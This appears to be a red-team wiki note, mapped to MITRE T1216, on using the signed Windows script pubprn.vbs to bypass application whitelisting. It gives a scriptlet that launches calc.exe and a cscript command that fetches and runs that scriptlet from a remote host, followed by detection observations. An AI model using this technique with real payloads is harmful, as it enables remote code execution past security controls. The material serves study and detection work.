---
description: >-
  Signed Script Proxy Execution - bypass application whitelisting using
  pubprn.vbs
---

# pubprn.vbs Signed Script Code Execution

## pubprn.vbs Signed Script Code Execution

### Execution

Using pubprn.vbs, we will execute code to launch calc.exe. First of, the xml that will be executed by the script:

{% code title="<http://192.168.2.71/tools/mitre/proxy-script/proxy.sct>" %}
```markup
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"   
	>
</registration>

<script language="JScript">
<![CDATA[
		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");	
]]>
</script>

</scriptlet>
```
{% endcode %}

{% code title="attacker\@victim" %}
```csharp
cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http://192.168.2.71/tools/mitre/proxy-script/proxy.sct
```
{% endcode %}

### Observations

Calc.exe gets spawned by cscript.exe which immediately closes leaving the calc.exe process orphan:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LI2NLhQvyfAE_V98Da4%2F-LI2ODZRD6ri-CkAzeYT%2Fpubprn-csript.png?alt=media\&token=eaa92f70-9ceb-451b-b00a-953fb9234644)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LI2NLhQvyfAE_V98Da4%2F-LI2OF_pE8rPLNHG0ciM%2Fpubprn-ancestry.png?alt=media\&token=a73bf5ff-c128-4bd3-8078-f357ad729b77)

Monitoring commandlines can be useful in detecting the script being abused:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIHSTBBhujbieofKNqG%2F-LIHTuiKgire5SPCG3h_%2Fpubprn-logs.png?alt=media\&token=1d7d45bb-49c0-4076-a928-bb69052a9130)

### References

{% embed url="https://attack.mitre.org/wiki/Technique/T1216" %}
